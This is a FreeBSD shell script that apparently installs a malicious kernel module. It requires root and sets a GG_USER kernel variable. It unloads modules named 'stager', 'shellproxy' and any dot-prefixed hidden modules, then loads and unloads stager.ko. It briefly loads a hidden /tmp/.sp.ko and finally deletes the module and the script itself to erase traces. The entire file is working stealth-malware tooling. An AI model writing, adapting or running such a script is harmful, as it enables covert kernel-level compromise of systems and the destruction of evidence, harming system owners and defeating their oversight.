#!/bin/sh
set -e

cd "$(dirname "$0")"

if [ "$(id -u)" != "0" ]; then
	echo "[install] root required" >&2
	exit 1
fi

if [ -n "${1:-}" ]; then
	/bin/kenv GG_USER="$1"
else
	/bin/kenv -q -u GG_USER >/dev/null 2>&1 || true
fi

kldunload stager >/dev/null 2>&1 || true
kldunload -n shellproxy >/dev/null 2>&1 || true
for m in $(kldstat 2>/dev/null | awk '$5 ~ /^\./ {print $5}'); do
	kldunload "$m" >/dev/null 2>&1 || true
done

if [ "$(stat -f %z stager.ko 2>/dev/null)" -lt 1024 ] || \
   [ "$(head -c 4 stager.ko | od -An -tx1 | tr -d ' \n')" != "7f454c46" ]; then
	echo "[install] stager.ko corrupt or unreadable" >&2
	exit 1
fi

kldload ./stager.ko

if ! kldstat -m stager >/dev/null 2>&1; then
	echo "[install] stager load fail" >&2
	exit 1
fi

kldunload stager

if [ -f /tmp/.sp.ko ]; then
	kldload /tmp/.sp.ko || true
	sleep 1
	kldunload .sp.ko >/dev/null 2>&1 || true
	rm -f /tmp/.sp.ko
fi

if kldstat -m stager >/dev/null 2>&1; then
	echo "[install] stager unload fail" >&2
	exit 1
fi

/bin/kenv -q -u GG_USER >/dev/null 2>&1 || true

# purge it
rm -f stager.ko "$0"
